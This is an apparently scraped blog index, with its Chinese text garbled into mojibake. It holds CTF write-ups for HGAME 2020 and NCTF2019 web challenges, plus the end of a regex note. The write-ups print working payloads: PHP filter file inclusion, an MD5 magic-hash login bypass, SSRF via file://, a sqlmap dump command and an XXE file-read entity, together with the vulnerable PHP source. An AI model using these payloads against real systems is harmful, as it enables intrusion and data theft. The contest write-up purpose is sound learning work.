è€Œ\u0026quot;txt\u0026quot;è¿™ä¸ªç»„é‡Œçš„å€¼ä¸º\u0026quot; are you doing\u0026quot;;\n\u0026quot;(?!exp)\u0026quot; åŒ¹é…åé¢è·Ÿçš„ä¸æ˜¯expçš„ä½ç½®\nã€€å¦‚ \u0026ldquo;123abc\u0026rdquo; æ­£åˆ™ \u0026ldquo;\\d{3}(?!\\d)\u0026ldquo;åŒ¹é…3ä½æ•°å­—åéæ•°å­—çš„ç»“æœ\n\u0026quot;(?\u0026lt;!exp)\u0026quot; åŒ¹é…å‰é¢ä¸æ˜¯expçš„ä½ç½®\nã€€å¦‚ \u0026ldquo;abc123 \u0026quot; æ­£åˆ™ \u0026ldquo;(?\u0026lt;![0-9])123\u0026rdquo; åŒ¹é…\u0026quot;123\u0026quot;å‰é¢æ˜¯éæ•°å­—çš„ç»“æœä¹Ÿå¯å†™æˆ\u0026rdquo;(?!\u0026lt;\\d)123\u0026rdquo;\n","date":"2020-01-27T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ ç¬”è®°"},{"content":"hgame2020æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚åŠ çš„ä¸ªäººèµ›ï¼›\nå®˜æ–¹wpï¼šhttps://github.com/vidar-team/Hgame2020_writeup\nbyc_404å¸ˆå‚…çš„wpï¼šhttps://www.jianshu.com/p/5bb6ecd67293\nlevel-week 1  web2_æ¥å¤´éœ¸ç‹ è¿™é“é¢˜èµ·åˆæ²¡æœ‰æ˜ç™½æ¥å¤´éœ¸ç‹æ˜¯ä»€ä¹ˆæ„æ€ï¼Œåæ¥åšå®Œä¹‹åæ‰å‘ç°è¿™ä¸ªâ€œå¤´â€æŒ‡çš„æ˜¯HTTPè¯·æ±‚å¤´ï¼›ï¼ˆç°å…”å­è„¸\nèµ°æµç¨‹ï¼ŒæŠ“åŒ…ï¼š\n\u0026ldquo;You need to come from https://vidar.club\u0026rdquo;ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹httpå¤´é‡Œé¢çš„refererï¼š\nç»§ç»­çœ‹ï¼š\u0026ldquo;You need to visit it locally\u0026rdquo;,æ˜¾ç„¶æ˜¯XFFå¤´ï¼š\nx-forwarded-for: 127.0.0.1\r\u0026ldquo;the flag will be update after 2077,please wait for patiently\u0026rdquo;,æ˜¾ç„¶ä¸å¯èƒ½ç­‰åˆ°2077å¹´ï¼Œäºæ˜¯ä¿®æ”¹ï¼š\nif-unmodified-since: Wed, 21 Oct 2077 07:28:00 GMT\r(åªè¦æ˜¯2077å¹´ä¹‹åéƒ½è¡Œ)\n HTTPåè®®ä¸­çš„ If-Unmodified-Since æ¶ˆæ¯å¤´ç”¨äºè¯·æ±‚ä¹‹ä¸­ï¼Œä½¿å¾—å½“å‰è¯·æ±‚æˆä¸ºæ¡ä»¶å¼è¯·æ±‚ï¼šåªæœ‰å½“èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ²¡æœ‰è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ‰ä¼šè¿”å›è¯·æ±‚çš„èµ„æºï¼Œæˆ–æ˜¯æ¥å— POST æˆ–å…¶ä»– non-safe æ–¹æ³•çš„è¯·æ±‚ã€‚å¦‚æœæ‰€è¯·æ±‚çš„èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åå‘ç”Ÿäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆä¼šè¿”å› 412 (Precondition Failed) é”™è¯¯ã€‚  æ‹¿åˆ°flagï¼›\nweb3_codewolrd ç‚¹è¿›å»æ˜¯ä¸€ä¸ª403é¡µé¢ï¼Œf12ï¼Œçœ‹æºç ï¼Œå‘ç°\u0026lt;script\u0026gt;é‡Œé¢æœ‰ä¸€è¡Œæç¤ºï¼š\nThis new site is building\u0026hellip;.But our stupid developer Cosmos did 302 jump to this page..F**k!\nåº”è¯¥æ˜¯302è·³è½¬ï¼›\n å½“æˆ‘ä»¬ç”¨æµè§ˆå™¨å»è®¿é—®æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°æŒ‡å®šçš„é¡µé¢ï¼Œè€Œæ­¤é¡µé¢å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„å«æœ‰flagçš„é¡µé¢ï¼Œé€šè¿‡æŠ“åŒ…å¯ä»¥çœ‹åˆ°é¡µé¢è¢«é‡å®šå‘ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åº”è¯¥æƒ³åŠæ³•è®©é¡µé¢ä¸é‡å®šå‘ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¿åˆ°flagäº†  äºæ˜¯ï¼Œæˆ‘å°±æƒ³åˆ°äº† curl è¿™ä¸ªå‘½ä»¤ï¼Œè¯¥å‘½ä»¤åªæœ‰åœ¨åŠ å‚æ•° -L çš„æƒ…å†µä¸‹æ‰ä¼šé‡å®šå‘ã€‚\nWindowsä¸‹curlçš„å®‰è£…ä»¥åŠè§£å†³ä¸­æ–‡ä¹±ç ï¼šhttps://segmentfault.com/a/1190000015115481\niconvæ˜¯å¦ä¸€ä¸ªå·¥å…·ï¼Œiconv -f utf-8 -t gbkæ˜¯è§£å†³ä¹±ç ï¼š\nç»§ç»­è¯•ï¼š\nçœ‹åˆ°æ˜¾ç¤ºçš„äººé¸¡éªŒè¯ï¼ŒçŸ¥é“è‚¯å®šæœ‰ä¸œè¥¿ï¼ˆæ»‘ç¨½ï¼Œç„¶åè¿™é‡Œå¡äº†ä¸€ä¸‹åˆï¼ŒçŸ¥é“ç¬¬äºŒå¤©çœ‹åˆ°é¢˜ç›®æè¿°æ‰æ‡‚ï¼š\nç„¶åæ˜¯æ˜ç™½urlé‡Œé¢+å·éœ€è¦ç¼–ç ï¼š+ â€”â€”\u0026gt; %2b ï¼›ç›´æ¥ç”¨+å·è¡¨ç¤ºç©ºæ ¼ï¼›\nä½¿ç”¨burp suiteåŒæ ·å¯ä»¥åšï¼Œåªä¸è¿‡è¦æŠ“è·³è½¬ä¹‹å‰çš„åŒ…ï¼š\næ‹¿åˆ°flagï¼›\nweb4_jiä½ å¤ªç« æœ¬é¢˜æ²¡æœ‰å‘ç°ä»€ä¹ˆæ­£å¸¸æ€è·¯ï¼ˆå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ç‚¹è¿›å»ä¸€ä¸ªé¡µé¢ï¼Œå«ä½ ç©æ¸¸æˆï¼š\næ¸¸æˆä¸éš¾ï¼Œé€šå…³ä¹‹åï¼Œæ²¡æœ‰ä»»ä½•ååº”ï¼Œæ‰€ä»¥é‡å¼€æ•…æ„æ­»ä¸€æ¬¡ï¼š\n3wåˆ†æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºå°±ç®—ä¸æ­»ï¼Œæ¯ä¸€å…³åˆ†æ•°æ¸…é›¶ï¼›ç„¶åå°±å»burpé‡Œé¢çœ‹ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå¯ç–‘çš„historyï¼ˆå› ä¸ºæ˜¯POSTï¼‰ï¼š\nç‚¹è¿›å»ï¼Œhttpè¯·æ±‚ä½“é‡Œé¢æœ‰ä¸ªé”®åå«scoreï¼Œæç„¶å¤§æ‚Ÿï¼š\nflagå…¥æ‰‹ï¼›\nweek1é¢˜ç›®ç»“æŸï¼›\nlevel-week 2  web1_Cosmosçš„åšå®¢åå° ç‚¹å¼€é¢˜ç›®ï¼š\nåœ¨burpsuiteé‡Œé¢å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªåŒ…ï¼Œä¸€ä¸ªæ˜¯ä»index.phpé‡å®šå‘è¿‡æ¥çš„ï¼Œä¸€ä¸ªæ˜¯login.phpï¼›\nç”±å‚æ•° \u0026lsquo;action=\u0026rsquo; è”æƒ³åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ ç¬”è®°ï¼‰ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨å‡ ä¸ªPHPä¼ªåè®®æ¥è¯»å–é¡µé¢çš„æºç ï¼›\nè¿™é‡Œé™„ä¸Šå‡ ä¸ªåè®®çš„ç”¨æ³•ï¼š\nplayloadï¼š\nhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=index.php\rhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\rå¯ä»¥å¾—åˆ°ä¸¤ä¸ªé¡µé¢çš„ï¼ˆbase64åŠ å¯†è¿‡åçš„ï¼‰æºç ï¼›\nlogin.php:\n\u0026lt;?php\rinclude \u0026quot;config.php\u0026quot;;\rsession_start();\r//Only for debug\rif (DEBUG_MODE){\rif(isset($_GET['debug'])) {\r$debug = $_GET['debug'];\rif (!preg_match(\u0026quot;/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\u0026quot;, $debug)) { die(\u0026quot;args error!\u0026quot;);\r}\reval(\u0026quot;var_dump($$debug);\u0026quot;);\r}\r}\rif(isset($_SESSION['username'])) {\rheader(\u0026quot;Location: admin.php\u0026quot;);\rexit();\r}\relse {\rif (isset($_POST['username']) \u0026amp;\u0026amp; isset($_POST['password'])) {\rif ($admin_password == md5($_POST['password']) \u0026amp;\u0026amp; $_POST['username'] === $admin_username){\r$_SESSION['username'] = $_POST['username'];\rheader(\u0026quot;Location: admin.php\u0026quot;);\rexit();\r}\relse {\recho \u0026quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\u0026quot;;\r}\r}\r}\r?\u0026gt;\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;zh-CN\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge\u0026quot;\u0026gt;\r\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1\u0026quot;\u0026gt;\r\u0026lt;meta name=\u0026quot;description\u0026quot; content=\u0026quot;\u0026quot;\u0026gt;\r\u0026lt;meta name=\u0026quot;author\u0026quot; content=\u0026quot;\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Cosmosçš„åšå®¢åå°\u0026lt;/title\u0026gt;\r\u0026lt;link href=\u0026quot;static/signin.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\r\u0026lt;link href=\u0026quot;static/sticky-footer.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\r\u0026lt;link href=\u0026quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt;\r\u0026lt;form class=\u0026quot;form-signin\u0026quot; method=\u0026quot;post\u0026quot; action=\u0026quot;login.php\u0026quot;\u0026gt;\r\u0026lt;h2 class=\u0026quot;form-signin-heading\u0026quot;\u0026gt;åå°ç™»é™†\u0026lt;/h2\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;username\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;ç”¨æˆ·å\u0026quot; required autofocus\u0026gt;\r\u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;password\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;å¯†ç \u0026quot; required\u0026gt;\r\u0026lt;input class=\u0026quot;btn btn-lg btn-primary btn-block\u0026quot; type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit\u0026quot;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;footer class=\u0026quot;footer\u0026quot;\u0026gt;\r\u0026lt;center\u0026gt;\r\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt;\r\u0026lt;p class=\u0026quot;text-muted\u0026quot;\u0026gt;Created by Annevi\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/center\u0026gt;\r\u0026lt;/footer\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rindex.php:\n\u0026lt;?php\rerror_reporting(0);\rsession_start();\rif(isset($_SESSION['username'])) {\rheader(\u0026quot;Location: admin.php\u0026quot;);\rexit();\r}\r$action = @$_GET['action'];\r$filter = \u0026quot;/config|etc|flag/i\u0026quot;;\rif (isset($_GET['action']) \u0026amp;\u0026amp; !empty($_GET['action'])) {\rif(preg_match($filter, $_GET['action'])) {\recho \u0026quot;Hacker get out!\u0026quot;;\rexit();\r}\rinclude $action;\r}\relseif(!isset($_GET['action']) || empty($_GET['action'])) {\rheader(\u0026quot;Location: ?action=login.php\u0026quot;);\rexit();\r}\rè¿‡æ»¤äº†flagå…³é”®å­—ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ–‡ä»¶åŒ…å«è¯»flag\nç»§ç»­çœ‹ï¼Œlogin.phpé‡Œé¢çš„debugï¼š\nï¼ˆPHPä¸­çš„é­”æœ¯å˜é‡ï¼‰æ„æ€æ˜¯GETè¿‡å»çš„debugç­‰äºä»€ä¹ˆåå­—å°±è¾“å‡ºä»€ä¹ˆåå­—çš„å˜é‡\nå°±å¾ˆniceï¼š\nhttp://cosmos-admin.hgame.day-day.work/login.php?action=login.php\u0026amp;debug=admin_username\rhttp://cosmos-admin.hgame.day-day.work/login.php?action=login.php\u0026amp;debug=admin_password\rå¯ä»¥åˆ†åˆ«å¾—åˆ°ï¼š\nç”¨æˆ·åï¼šCosmos!\nå¯†ç ï¼šï¼ˆmd5åŠ å¯†åï¼‰0e114902927253523756713132279690\nç„¶åå¯†ç åˆæ˜¯å¼±ç±»å‹åˆ¤æ–­ï¼ˆå¸¸è§MD5ç¢°æ’çš„playloadï¼‰ï¼›\näºæ˜¯è¾“å…¥å¯†ç  ï¼š\nQNKCDZO\rç™»å½•æˆåŠŸï¼š\nçœ‹æ ·å­åªæœ‰æ’å…¥å›¾ç‰‡çš„åœ°æ–¹èƒ½æäº‹ï¼›\nXSSä¸èƒ½è¯»å–æœåŠ¡å™¨æ–‡ä»¶ï¼Œé‚£å°±SSRFï¼š\nfile:///flag\rè¯•ä¸€ä¸‹ï¼Œä¸è¡Œï¼›\næ–‡ä»¶åŒ…å«è¯»å–admin.php:\nhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=admin.php\radmin.php:\n\u0026lt;?php\rinclude \u0026quot;config.php\u0026quot;;\rsession_start();\rif(!isset($_SESSION['username'])) {\rheader('Location: index.php');\rexit();\r}\rfunction insert_img() {\rif (isset($_POST['img_url'])) {\r$img_url = @$_POST['img_url'];\r$url_array = parse_url($img_url);\rif (@$url_array['host'] !== \u0026quot;localhost\u0026quot; \u0026amp;\u0026amp; $url_array['host'] !== \u0026quot;timgsa.baidu.com\u0026quot;) {\rreturn false;\r} $c = curl_init();\rcurl_setopt($c, CURLOPT_URL, $img_url);\rcurl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\r$res = curl_exec($c);\rcurl_close($c);\r$avatar = base64_encode($res);\rif(filter_var($img_url, FILTER_VALIDATE_URL)) {\rreturn $avatar;\r}\r}\relse {\rreturn base64_encode(file_get_contents(\u0026quot;static/logo.png\u0026quot;));\r}\r}\r?\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;Cosmosâ€™ Blog - åå°ç®¡ç†\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;a href=\u0026quot;logout.php\u0026quot;\u0026gt;é€€å‡ºç™»é™†\u0026lt;/a\u0026gt;\r\u0026lt;div style=\u0026quot;text-align: center;\u0026quot;\u0026gt;\r\u0026lt;h1\u0026gt;Welcome \u0026lt;?php echo $_SESSION['username'];?\u0026gt; \u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;fieldset style=\u0026quot;width: 30%;height: 20%;float:left\u0026quot;\u0026gt;\r\u0026lt;legend\u0026gt;æ’å…¥å›¾ç‰‡\u0026lt;/legend\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;label\u0026gt;å›¾ç‰‡url: \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;img_url\u0026quot; placeholder=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/label\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; name=\u0026quot;submit\u0026quot;\u0026gt;æ’å…¥\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/fieldset\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;fieldset style=\u0026quot;width: 30%;height: 20%;float:left\u0026quot;\u0026gt;\r\u0026lt;legend\u0026gt;è¯„è®ºç®¡ç†\u0026lt;/legend\u0026gt;\r\u0026lt;h2\u0026gt;å¾…å¼€å‘..\u0026lt;/h2\u0026gt;\r\u0026lt;/fieldset\u0026gt;\r\u0026lt;fieldset style=\u0026quot;width: 30%;height: 20%;\u0026quot;\u0026gt;\r\u0026lt;legend\u0026gt;æ–‡ç« åˆ—è¡¨\u0026lt;/legend\u0026gt;\r\u0026lt;h2\u0026gt;å¾…å¼€å‘..\u0026lt;/h2\u0026gt;\r\u0026lt;/fieldset\u0026gt;\r\u0026lt;fieldset style=\u0026quot;height: 50%\u0026quot;\u0026gt;\r\u0026lt;div style=\u0026quot;text-align: center;\u0026quot;\u0026gt;\r\u0026lt;img height='200' width='500' src='data:image/jpeg;base64,\u0026lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(\u0026quot;static/error.jpg\u0026quot;)); ?\u0026gt;'\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/fieldset\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rçœ‹åˆ°æœ‰ä¸€ä¸ªè¿‡æ»¤:\näºæ˜¯ï¼š\nfile://localhost/flag\raGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo=\rbase64è§£ç ï¼š\nhgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}\nCosmosçš„ç•™è¨€æ¿ æœ€å¼€å§‹æ²¡æœ‰å‘ç°ä»€ä¹ˆæ€è·¯ï¼Œåæ¥æ˜¯ç”¨kaliä¸‹çš„sqlmapæ‰«äº†å‡ºæ¥ï¼Œè¿™é‡Œè¦ç”¨åˆ°sqlmapçš„tamper\nè¿™é‡Œå°±ç›´æ¥ä¸Šplayload:\nsqlmap -u \u0026quot;http://139.199.182.61/index.php?id=1\u0026quot; -D easysql -T f1aggggggggggggg -C fl4444444g --dump --tamper \u0026quot;randomcase.py,space2comment.py\u0026quot;\rhgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}\n","date":"2020-01-17T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png","permalink":"https://anthem-whisper.github.io/p/hgame-2020_web/","title":"HGAME 2020_Web"},{"content":"NCTF2019web1:fake xml cookbook_writeup\nBy:0xfxxker_wh1sper\nè§£é¢˜æ€è·¯ï¼š\nè¿™é“é¢˜åå­—æ˜¯XMLï¼Œå…³äºXMLæˆ‘çŸ¥é“çš„åªæœ‰ä¸¤ç§æ‰‹æ®µï¼Œä¸€æ˜¯æ™®é€šXMLæ³¨å…¥ï¼Œé€šè¿‡é—­åˆå„ç§æ ‡ç­¾ç„¶åæ¤å…¥æ¶æ„ä»£ç è¿è¡Œè„šæœ¬ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ç§æ‰‹æ®µå®åœ¨æ”»å‡»è€…èƒ½å¤ŸæŒæ¡passwordå­—æ®µå¹¶ä¸”èƒ½å¤Ÿä¿å­˜åˆ°æœåŠ¡å™¨å½“ä¸­å»æ‰èƒ½å¤Ÿæ·»åŠ ä¸€ä¸ªæ–°çš„adminè´¦æˆ·ï¼ˆå½“æ—¶ä¹Ÿåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼‰ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œåˆ©ç”¨ç‚¹æ˜¯å¤–éƒ¨å®ä½“ï¼Œå¦‚æœèƒ½æ³¨å…¥ï¼Œå¤–éƒ¨å®ä½“å¹¶ä¸”æˆåŠŸè§£æçš„è¯ï¼Œè¿™å°±ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬ XML æ³¨å…¥çš„æ”»å‡»é¢ï¼ˆè¿™å¯èƒ½å°±æ˜¯ä¸ºä»€ä¹ˆå•ç‹¬è¯´ è€Œæ²¡æœ‰è¯´ XML æ³¨å…¥çš„åŸå› å§ï¼Œæˆ–è®¸æ™®é€šçš„ XML æ³¨å…¥çœŸçš„å¤ªé¸¡è‚‹äº†ï¼Œç°å®ä¸­å‡ ä¹ç”¨ä¸åˆ°ï¼‰ã€‚\nç”¨æˆ·åï¼Œå¯†ç éšä¾¿è¯•ä¸€ä¸‹ï¼š\næŠ“åŒ…ï¼Œåˆ†æ:\näºæ˜¯æˆ‘æ„é€ äº†å¦‚ä¸‹XMLå¤–éƒ¨å®ä½“ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·\næ³¨æ„äº‹é¡¹ï¼š\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE dyï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰ [\r\u0026lt;!ENTITY dy SYSTEM \u0026quot;file:///flag\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;dy;ï¼ˆåˆ†å·ï¼‰\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\ré€šè¿‡POSTè¯·æ±‚å‘è¿‡å»\næœåŠ¡å™¨è¯´ç™»å½•å¤±è´¥ï¼Œå¹¶ä¸”è¿”å›\u0026amp;dyï¼Œä¹Ÿå°±æ˜¯/flagçš„å†…å®¹\nè¿™é‡ŒæŒ‚ä¸€ç¯‡å…³äºxxeçš„å­¦ä¹ æ–‡æ¡£ï¼šhttp://url.cn/54Ucm5w\n","date":"2019-12-27T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/nctf2019_fakexml_cookbook/","title":"NCTF2019_Fakexml_cookbook"}]